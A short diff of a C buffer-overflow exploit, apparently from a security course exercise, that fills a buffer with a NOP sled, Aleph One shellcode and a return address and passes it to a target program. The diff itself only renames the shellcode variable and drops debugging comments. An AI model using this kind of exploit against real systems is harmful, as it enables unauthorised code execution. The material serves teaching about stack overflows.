@@ -26,8 +26,8 @@ int main(void)
   memset(buffer, 0x90, BUFFER_SIZE-4);
 
   // Copy over shellcode
-  memcpy(buffer + 203, shellcode, sizeof(shellcode)-1); // There's a 0 byte at the end of this?!?!
-  printf("Size of shellcode: %d\n", sizeof(shellcode));
+  memcpy(buffer + 203, shellcodeAlephOne, sizeof(shellcodeAlephOne)-1); // There's a 0 byte at the end of this?!?!
+  printf("Size of shellcode AlephOne: %d\n", sizeof(shellcodeAlephOne));
 
   memcpy(buffer+404, addr, sizeof(addr)-1);
   printf("Size of addr: %d\n", sizeof(addr));
@@ -37,11 +37,7 @@ int main(void)
     printf("Buffer[%d] = 0x%x\n", i, buffer[i]); 
   }
 
-  // TODO: Just testing to break the stack
-  // memset(buffer, 'A', BUFFER_SIZE);
-
   args[0] = TARGET; // Must contain filename of file being executed
-  // args[1] = "student"; // TODO: Replace with shell code
   // args[1] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // 399 'A's
   args[1] = buffer;
   args[2] = NULL; // argv and envp arrays must each include a null pointer at end of array
